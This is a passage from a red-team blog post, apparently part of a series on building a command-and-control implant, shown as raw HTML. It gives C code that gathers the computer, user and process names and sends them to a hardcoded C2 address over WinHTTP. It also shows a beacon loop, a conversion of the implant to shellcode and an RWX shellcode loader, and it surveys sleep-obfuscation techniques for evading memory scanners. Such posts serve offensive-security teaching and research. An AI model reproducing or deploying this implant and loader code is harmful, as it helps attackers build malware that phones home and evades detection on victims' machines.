            DebugExport f = reinterpret_cast&lt;DebugExport&gt;(<span class="pl-c1">GetProcAddress</span>(hModule, <span class="pl-s"><span class="pl-pds">"</span>DebugExport<span class="pl-pds">"</span></span>));
            <span class="pl-c1">f</span>();
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<p>We found this to be a cleaner debugging experience than messing with x64dbg.</p>
<h3>Checking In</h3>
<p>As soon as the implant is launched, the first thing to occur is some basic enumeration which will identify the host:</p>
<pre><code class="language-c"><span class="pl-k">char</span>* <span class="pl-en">GetMachineInfo</span>()
        {
            CHAR lpProcessName[MAX_PATH];
            CHAR lpComputerName[MAX_PATH];
            CHAR lpUserName[MAX_PATH];
            DWORD nSize = MAX_PATH;
        
            <span class="pl-k">if</span> (!<span class="pl-c1">GetComputerNameA</span>(lpComputerName, &amp;nSize))
            {
                <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
            }
        
            <span class="pl-k">if</span> (!<span class="pl-c1">GetUserNameA</span>(lpUserName, &amp;nSize))
            {
                <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
            }
        
            <span class="pl-k">if</span> (!<span class="pl-c1">GetModuleFileNameA</span>(<span class="pl-c1">NULL</span>, lpProcessName, MAX_PATH))
            {
                <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
            }
        
            DWORD dwPid = <span class="pl-c1">GetCurrentProcessId</span>();
        
            <span class="pl-k">char</span>* data = <span class="pl-c1">malloc</span>(MAX_PATH * <span class="pl-c1">5</span>);
        
            <span class="pl-k">if</span> (!data)
            {
                <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;
            }
        
            <span class="pl-c1">sprintf</span>(data,
                <span class="pl-s"><span class="pl-pds">"</span>{ <span class="pl-cce">\"</span>init<span class="pl-cce">\"</span>: {<span class="pl-cce">\"</span>processname<span class="pl-cce">\"</span>: <span class="pl-cce">\"</span><span class="pl-c1">%s</span><span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>computername<span class="pl-cce">\"</span>: <span class="pl-cce">\"</span><span class="pl-c1">%s</span><span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>username<span class="pl-cce">\"</span>: <span class="pl-cce">\"</span><span class="pl-c1">%s</span><span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>dwpid<span class="pl-cce">\"</span>: <span class="pl-cce">\"</span><span class="pl-c1">%ld</span><span class="pl-cce">\"</span>}}<span class="pl-pds">"</span></span>,
                lpProcessName, lpComputerName, lpUserName, dwPid);
        
            <span class="pl-c1">Xor</span>(data, <span class="pl-c1">strlen</span>(data), <span class="pl-c1">0xff</span>);
        
            <span class="pl-k">return</span> data;
        
        }
        
</code></pre>
<p>In the code above, the process, computer, and username are packed into a json string, along with the process ID. This is just XOR'd with a hardcoded hex value as a proof-of-concept. In a production C2, this should be encrypted with something like AES256-CBC or an equivalent encryption algorithm. As this is an example project, we don't care for this step.</p>
<p>This is something discussed in <a href="https://pre.empt.blog/maelstrom-2/">Maelstrom: Building the Team Server</a>, and it was making the data being sent between client and server difficult to read. Whether its layers of encryption, or masking data as a MAC Address; we highly recommend something is done to transform the data. For this demo, we don't care about any of that, so its just sent to the <code>Initialise()</code> function:</p>
<pre><code class="language-c"><span class="pl-c">// Gather initial info</span>
        <span class="pl-k">char</span>* machineInfo = GetMachineInfo();
        
        <span class="pl-c">// Check-in</span>
        <span class="pl-k">if</span> (Initialise(machineInfo) == <span class="pl-c1">FALSE</span>)
        {
            <span class="pl-k">return</span>;
        }
        
</code></pre>
<p>Which is just a wrapper around the <code>SendRequestA()</code> function:</p>
<pre><code class="language-c">BOOL <span class="pl-en">Initialise</span>(<span class="pl-k">char</span>* machineInfo)
        {
            <span class="pl-k">if</span> (<span class="pl-c1">SendRequestA</span>(machineInfo))
            {
                <span class="pl-k">return</span> <span class="pl-c1">TRUE</span>;
            }
            <span class="pl-k">else</span>
            {
                <span class="pl-k">return</span> <span class="pl-c1">FALSE</span>;
            }
        }
        
</code></pre>
<p>The <code>SendRequestA()</code> function uses WinHTTP, and relies on a bunch of WinAPI Calls. So, lets get into the configuration of the requests.</p>
<p>Similarly to stage 0, the config is hard-coded:</p>
<pre><code class="language-c">LPCWSTR wVerb = L<span class="pl-s"><span class="pl-pds">"</span>GET<span class="pl-pds">"</span></span>;
        LPCWSTR wEndpoint = L<span class="pl-s"><span class="pl-pds">"</span>/a<span class="pl-pds">"</span></span>;
        LPCWSTR wUserAgent = L<span class="pl-s"><span class="pl-pds">"</span>Maelstrom<span class="pl-pds">"</span></span>;
        LPCWSTR wVersion = L<span class="pl-s"><span class="pl-pds">"</span>HTTP 1/1<span class="pl-pds">"</span></span>;
        LPCWSTR wServer = L<span class="pl-s"><span class="pl-pds">"</span>10.10.11.205<span class="pl-pds">"</span></span>;
        LPCWSTR wReferer = L<span class="pl-s"><span class="pl-pds">"</span>https://google.com<span class="pl-pds">"</span></span>;
        LPCWSTR wHeaders = L<span class="pl-s"><span class="pl-pds">"</span>X-Maelstrom: password<span class="pl-pds">"</span></span>;
        
</code></pre>
<p>And some additional config:</p>
<pre><code class="language-c"><span class="pl-k">int</span> port = <span class="pl-c1">5555</span>;
        BOOL bSsl = <span class="pl-c1">FALSE</span>;
        BOOL bProxy = <span class="pl-c1">FALSE</span>;
        
</code></pre>
<p>Again, to repeat ourselves, do not leave these hard-coded.</p>
<p>Once it has initialised, we hit <code>Start()</code>:</p>
<pre><code class="language-c"><span class="pl-k">void</span> <span class="pl-en">Start</span>()
        {
            <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Starting...<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
            BOOL bRun = <span class="pl-c1">TRUE</span>;
            DWORD dwOp = <span class="pl-c1">rand</span>() % <span class="pl-c1">4</span> + <span class="pl-c1">1</span>;
            
            <span class="pl-k">while</span> (bRun)
            {
                <span class="pl-k">switch</span> (dwOp)
                {
                <span class="pl-k">case</span> <span class="pl-c1">0</span>:
                    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Simulating Task: 0<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
                    <span class="pl-c1">Sleep</span>(<span class="pl-c1">5000</span>);
                    <span class="pl-k">break</span>;
                <span class="pl-k">case</span> <span class="pl-c1">1</span>:
                    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Simulating Task: 1<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
                    <span class="pl-c1">Sleep</span>(<span class="pl-c1">5000</span>);
                    <span class="pl-k">break</span>;
                <span class="pl-k">case</span> <span class="pl-c1">2</span>:
                    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Simulating Task: 2<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
                    <span class="pl-c1">Sleep</span>(<span class="pl-c1">5000</span>);
                    <span class="pl-k">break</span>;
                <span class="pl-k">case</span> <span class="pl-c1">3</span>:
                    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Simulating Task: 3<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
                    <span class="pl-c1">Sleep</span>(<span class="pl-c1">5000</span>);
                    <span class="pl-k">break</span>;
                }
                <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>Sleeping...<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
                <span class="pl-c1">Sleep</span>(<span class="pl-c1">10000</span>);
            }
        }
        
</code></pre>
<p>This is our simulation of tasking. Essentially it is operating as the component of the implant which will check, run, and return tasks. We are not providing that functionality though.</p>
<h3>Safe Sleeping</h3>
<p>One of the important ones is how the implant will look in memory in between operations. If the implant is just idling with nothing to do, it should sleep in such a way that memory scanners or engineers cannot easily identify it as malicious. This is something we will look at more in the runtime analysis, but lets take a quick look. If Process Hacker is used and the <code>RWX</code> region identified, this is how the region looks:</p>
<p><img src="https://pre.empt.blog/static/images/maelstrom-4-2.PNG" alt=""></p>
<p>In the above, we can see the <code>MZ</code> Header, the <code>DOS</code> Message, and various section names. This needs to be removed, but we will not be providing a solution to this as we want to align with the objectives we set out in section one; but we will offer some example projects for the enthusiastic reader:</p>
<ul>
<li><a href="https://github.com/JLospinoso/gargoyle">Gargoyle</a>: A a technique for hiding <em>all</em> of a program’s executable code in non-executable memory. At some programmer-defined interval, gargoyle will wake up–and with some ROP trickery–mark itself executable and do some work.</li>
<li><a href="https://github.com/y11en/FOLIAGE">Foliage</a>: Another ROP-based project (Also adapted and demonstrated in <a href="https://www.youtube.com/watch?v=7vv3y9dNQZg">Brute Ratel Live Demo @Un1k0d3r's Patreon (Charles Hamilton)</a>).</li>
<li><a href="https://solomonsklash.io/SleepyCrypt-shellcode-to-encrypt-a-running-image.html">SleepyCrypt</a>: Position-Independent Code to <a href="https://github.com/SolomonSklash/SleepyCrypt/blob/0991317c0ed7265ea128cc1c855c39f3626f3763/run.c#L191">encrypt sections</a>.</li>
<li><a href="https://github.com/mgeeky/ShellcodeFluctuation">ShellcodeFluctuation</a>: A proof-of-concept implementation for an another in-memory evasion technique that cyclically encrypts and decrypts shellcode's contents to then make it fluctuate between <code>RW</code> (or <code>NoAccess</code>) and <code>RX</code> memory protection.</li>
<li><a href="https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html">Studying “Next Generation Malware” - NightHawk’s Attempt At Obfuscate and Sleep</a>: Replicating one of Nighthawk's sleep protection mechanisms</li>
<li><a href="https://github.com/Cracked5pider/Ekko">Ekko</a>: Proof-of-concept of sleeping with Timers</li>
<li><a href="https://youtu.be/nB5QHVtN9_g">Brute Ratel C4 v/s Nighthawk and Open Source Sleep Obfuscation Techniques</a></li>
</ul>
<p>On May 5th 2022, <a href="https://twitter.com/ilove2pwn_">Austin Hudson</a> posted a <a href="https://twitter.com/ilove2pwn_/status/1522259942337613825">tweet</a> with a blog: <a href="https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html">Studying “Next Generation Malware” - NightHawk’s Attempt At Obfuscate and Sleep</a></p>
<p>This blog went through how Austin was able to identify a sample of <a href="https://www.mdsec.co.uk/nighthawk/">Nighthawk</a> which is a proprietary C2 from a UK-based Cyber Security Consultancy, <a href="https://www.mdsec.co.uk/">MDSec</a>. In this post, Austin discusses how the technique uses thread contexts and callbacks to flip the memory regions permissions (which we will discuss further in later posts).</p>
<p>For clarity, the research efforts for this technique, on behalf of <a href="https://www.mdsec.co.uk/">MDSec</a>, was <a href="https://twitter.com/peterwintrsmith">Peter Winter-Smith</a> and <a href="https://twitter.com/modexpblog">modexp</a>.</p>
<p>Once the proof-of-concept was made public by Austin, <a href="https://twitter.com/C5pider">C5pider</a> then built it out into an open-source tool called <a href="https://github.com/Cracked5pider/Ekko">Ekko</a>. However, this proof-of-concept uses the base address of the entire image as the region to protect, this only works when the malware is the entire EXE on disk, or loaded as a proper DLL. This can be seen on line <a href="https://github.com/Cracked5pider/Ekko/blob/9db598259ddcdc254d964b067ac141346ce7bb22/Src/Ekko.c#L36">36</a>:</p>
<pre><code class="language-c">ImageBase   = GetModuleHandleA( <span class="pl-c1">NULL</span> );
        
</code></pre>
<p>In the event that malware wants to load in the implant entirely through memory, so something like a Reflective DLL, this technique will not work as the <code>GetModuleHandleA</code> call will get the base address of the image the DLL is being loaded into. For example, say the DLL is being reflectively loaded into <code>calc.exe</code>, then the <code>GetModuleHandleA</code> will be the base of <code>calc.exe</code>.</p>
<h2>Producing Shellcode for Loaders and Droppers</h2>
<p>As we already have stage 0 as position independent which generates both an exe and bin for each stage 0 type, we can easily get the hex from the bin with:</p>
<pre><code>xxd -i maelstrom.x64.unsafe.bin &gt; shellcode.h
        
</code></pre>
<p>Produces:</p>
<pre><code class="language-c"><span class="pl-k">unsigned</span> <span class="pl-k">char</span> shellcode_bin[] = {
          <span class="pl-c">/* Too Long */</span>
        };
        <span class="pl-k">unsigned</span> <span class="pl-k">int</span> shellcode_bin_len = <span class="pl-c1">5248</span>;
        
</code></pre>
<p>This can then be loaded with:</p>
<pre><code class="language-c">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span>
        #<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>windows.h<span class="pl-pds">&gt;</span></span>
        #<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>buf.h<span class="pl-pds">"</span></span>
        
        <span class="pl-k">int</span> <span class="pl-en">main</span>()
        {
            LPVOID pAddress = <span class="pl-c1">VirtualAlloc</span>(<span class="pl-c1">nullptr</span>, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            <span class="pl-c1">memcpy</span>(pAddress, buf, buf_len);
            HANDLE hThread = <span class="pl-c1">CreateThread</span>(<span class="pl-c1">nullptr</span>, <span class="pl-c1">NULL</span>, (LPTHREAD_START_ROUTINE)pAddress, <span class="pl-c1">nullptr</span>, <span class="pl-c1">0</span>, <span class="pl-c1">nullptr</span>);
            <span class="pl-c1">Sleep</span>(<span class="pl-c1">10000</span>);
            <span class="pl-k">return</span> <span class="pl-c1">0</span>;
        }
        
</code></pre>
<p>Instead of calling <code>WaitForSingleObject</code> on the thread, we use a <code>Sleep</code> in the above because the shellcode will create a new thread and exit when the RDLL is loaded, causing the thread we are waiting on to exit successfully. So, for demonstration purposes, we just sleep.</p>
<p>Bare in mind, with the <code>SAFE</code> defined, it goes up to 8192.</p>
<p>To see how Metasploit got their payload so small, see <a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x64/src/block/block_reverse_https.asm">block_reverse_https.asm</a> and the build script at <a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/external/source/shellcode/windows/x64/build.py">build.py</a>.</p>
<p>Now that shellcode is achieved and is loadable, this can now be wrapped in any shellcode loader:</p>
<ul>
<li>.NET</li>
<li>Go</li>
<li>Rust</li>
<li>Nim</li>
</ul>
<p>You name it, it <em>should</em> work!</p>
<h2>Conclusion</h2>
<p>After long last, we finally have some code that runs, and a plan for more functionality and security. There are manifold ways to progress the implant from here, from improving the implant's operational security to fleshing out its communication channels.</p>
<p>This blog post has been pretty heavily in favour of the offense, and light on operational security. As we've discussed, defensive techniques such as hooking AMSI and ETW TI present a potent limitation on the operational security of the implant. Our next two posts will look at these protections, how they work, and how an implant can attempt to bypass them.</p></div></div></main></div></div>
  

</body></html>